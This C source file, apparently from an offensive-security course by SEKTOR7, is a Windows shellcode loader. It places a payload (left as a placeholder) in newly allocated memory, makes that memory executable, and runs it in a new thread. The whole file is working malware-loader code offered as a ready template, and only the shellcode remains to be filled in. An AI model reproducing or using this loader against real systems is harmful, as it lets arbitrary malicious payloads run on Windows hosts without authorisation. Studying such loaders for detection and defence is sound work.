// author: reenz0h(twitter : @SEKTOR7net)

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy paylload to new buffer
	RtlMoveMemory(exec_mem, payl, len);

	// Set new buffer as executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}